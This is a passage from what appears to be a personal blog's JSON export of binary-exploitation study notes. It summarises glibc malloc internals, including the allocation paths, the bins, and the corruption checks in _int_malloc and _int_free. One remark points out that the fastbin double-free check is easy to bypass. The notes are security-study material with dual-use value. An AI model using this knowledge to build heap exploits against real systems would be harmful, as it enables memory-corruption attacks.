is not enabled then it uses a malloc call to allocate space. If memory is returned then it returns memory after unmapping previous chunk and copying content.\nIf the process is single threaded then it calls _int_realloc() and asserts the returned pointer either is NULL or is mmapped or is ar_ptr is arena_for_chunk() If memory is failed to be obtained in one arena it checks or allocates memory through other arenas and returns a pointer to memory.\n\n_mid_memalign(size_t alignment, size_t bytes, void *addr)\nFunctionality of the code —\n\n__libc_malloc() is called if alignment is less or equal to malloc_alignment. Else it ensures it is a minimum chunk size. If the alignment is greater than SIZE_MAX /2 + 1 it can cause an overflow thus it sets error and exits.\nIt checks if alignment is a power of two.\nIf tcache is enabled gets tcache alongside checking all instances of pointers within the tcache is aligned. If tagging of memory is present then tagging is done and the pointer is returned. If no tcache mem or no tcache then does next.\nIf it is single threaded process it just calls _int_memalign() If the arena does not have enough space then it tries to get a new arena and then returns the tagged memory after finding the arena for chunk.\n\n__libc_valloc (size_t bytes)\nFunctionality of the code —\nSame functionality as malloc() but the memory returned by calls to valloc are page-aligned memory. It just calls mid_memalign but with pagesize argument. Same with libc_pvalloc() but it has an overflow check in the rounded_bytes given by pagesize\n__libc_calloc (size_t n, size_t elem_size)\nFunctionality of the code —\n\nChecks if the malloc_initialised flag is set, if not initialise malloc.  If tcache remains unitiated initiate tcache. If it is a single threaded process then it sets av as mainarena and then if av exists,\nMorecore clears flag is set then it gives by cutting from topsize. This means the normal morecore routine zeros memory if its greater than Minsize then the memory newly allocated is sure to be clear.\nWhile using mtags the whole memory is zeroed out irrespective of the morecore_clears flag. If the memory is not freshly sbrked then only the clearing happens.\n\nCORE FUNCTIONS\n_int_malloc (mstate av, size_t bytes)\nThe functionality of the code —\n\nConverts the requested size by padding it with the overhead size and checking with checked_request2size which checks for requests that wraps around 0.\nChecks for if any usable arenas exist &gt;&gt;\n\nIf yes it continues\nElse it calls sysmalloc instead with null which then sets up a region of memory, The arena checks were done previously in outer libc functions thus the following call is made directly without checking\n\n\nCHECK IF SIZE QUALIFIES AS FASTBIN —\n\nChecks if the memory within fastbin is greater than the chunk\nChecks if there is an available fastbin pointer in the index\n\nChecks if it is aligned if yes proceeds else calls error align fastbin\nChecks if chunksize belongs in fastbin if failed calls mem corruption:fastbin\nelse calls check_remalloced_chunk\n\n\nIf encountered other chunks of same size puts them into tcache if tcache_enabled. During this another fastbin check is present which checks for alignment of fastbins.\nAfter putting them in the tcache we return the pointer to the memory and return from the function. if perturb byte present does memset .\n\n\nCHECK IF THE SIZE QUALIFIES IN THE RANGE OF A SMALL BIN\n\nDoes the backward to forward check but not forward to back\nIf the av not main arena then sets non main arena bit\ntcache stashing occurs same as in fastbins and is unlinked from smallbins\nThe function returns the pointer finally which is of the requested size\n\n\nCHECK IF THE SIZE QUALIFIES IN THE RANGE OF A LARGE BIN\n\nWhen a large request is called it calls malloc_consolidate to free up fast bins and make memory available.\nSets the index to a large bin index, sets the tc_idx to a tcache index\n\n\nDoes an infinite loop\n\nCASE 1\n\n\nStarts looking at unsorted bins to satisfy request.\nMultiple checks are made to check for memory corruption\nChecks if it is the only unsorted chunk and if yes checks for the last remainder if the chunk was the last remainder then if the current size is satisfied the chunk is alloted and pointer is returned\n\n\nCASE 2\n\n\nIf the first fails it tries to fill tcache if it is best fit.\nIf tcache is full then it tries to return if it is exact fit\nGoes for smallbin first\n\nplaces the chunk in the bin\n\n\nGoes for largebin next\n\nplaces the chunk in sorted order\nHas the forward and backward ptr check alongside the _nextsize field check\n\n\nIf the tcache processing is complete it returns the tcached chunk at the index\nIf iteration exceeds 10000 it breaks\nIf all the small chunks found ended up cached return one\nIf it is a large request scan through the chunks of the current bin in sorted order to find the smallest that fits , uses a skiplist\nFinally it puts the remaining size after allocation into the unsorted bins\n\n\nLOOKS THROUGH THE BINMAP\n\nIf a proper chunk is obtained same procedure occurs\n\n\nSEES IF TOP CHUNK IS ENOUGH\n\nIf top chunk can satisfy the request the chunk is cut out and allocation is given\n\n\nCALLS SYSMALLOC IF NOTHING WORKS TO ALLOCATE THROUGH SYSTEM\n\n\n_int_free (mstate av, mchunkptr p,int have_lock)\nThe functionality of the code —\n\nChecks if the given pointer is misaligned or if the size is less than minsize, if failed exits else checks the inuse chunk.\nTCACHE DUMPING —\n\nIf tcache is enabled then it checks to see if its already in the tcache if yes it detects a double free.\nIf tcache count is greater than tcache_count var it states too many chunks and exits.\nIt also checks alignment and exits if unaligned.\nIf tcache putting worked then it returns\n\n\nFASTBIN FORWARDING —\n\nAgain checks are made but it checks the top of fastbin alone to check if a double free occured in single thread, thus making bypass easy.\nIn multi thread it checks all of the fastbins for a double free\nThen it gets a lock for it to add it to fastbin if it has a lock\n\n\nUNSORTED BIN THROWAWAY —\n\nChecks for double free corruption top , chunk boundary check , inuse check, invalid next size etc\nIt tries to consolidate backward if previze is not same as chunksize it states corrupted prev size and exits\nIt tries forward coalescing afterwards and unlinks the chunk and clears inuse bit.\nThe following chunk is thrown into the unsorted bins and then check_free_chunk is called.\nIf chunk borders top the chunk merges with the top\n\n\nOTHERS\n\nIt calls malloc_consolidate() if the fastbin_consolidation_threshold is met. and if av is main arena it tries systrim() if trim threshold is met.\nAlso tries heap_trim even if the top chunk is not large\nIf chunk was allocated due to mmap it does a munmap_chunk() call which unmaps the chunk.\n\n\n\nmalloc_consolidate(mstate av)\nChecks —\n\nfastbin alignment check\nchunk size check\nduring consolidation : prev_size check\nThe functionality of the code —\n\n\nREMOVAL INTO UNSORTED BINS —\n\nIt removes each chunk from the fastbin into an unsorted bin so that only during requirements will the sorting into actual bins happen.\nAfter putting a fastbin chunk into an unsorted bin it does a consolidation of the fastbins\nIf a fastbin chunk borders top chunk it merges down with the top chunk\n\n\n\n_int_realloc(mstate av,mchunkptr oldp,SIZE_T oldsize,SIZE_T nb)\nCHECKS MADE —\n\nSize check for next size, caller is filtered for mmapped chunks thus an assertion is made that the chunk is not mmapped.\nA check for size on old size on if it is valid.\n\nFunctionality of the code —\n\nIf it is already big enough it checks with the top chunk and coalesces down if next chunk is top chunk.\nIf next chunk is not top chunk then it tries to expand forward into next chunk if it is free and the next is a remainder\nIf nothing above works it allocates using _int_malloc\n\nIt does a copy if the newp obtained through malloc is not the very next chunk\nAnd it if it is the next chunk it extends the size and returns the given pointer itself.\n\n\nIf possible it tries to free extra space from the previous chunk and marks remainder as inuse so that free doesnt complain and then calls free on the remainder memory which can then put it into unsorted bins.\nIf memory tagging is there it returns tagged memory else untagged\nFinally the function returns\n"},"STACK-BASED-EXPLOITATION":{"title":"STACK-BASED-EXPLOITATION","links":[],"tags":["blog"],"content":""},"index":{"title":"ENTRYPOINT","links":["BINARY-EXPLOITATION"],"tags":["blog"],"content":"This is a blog where I will store all of my binary exploitation notes.\nEntrypoint : BINARY-EXPLOITATION"}}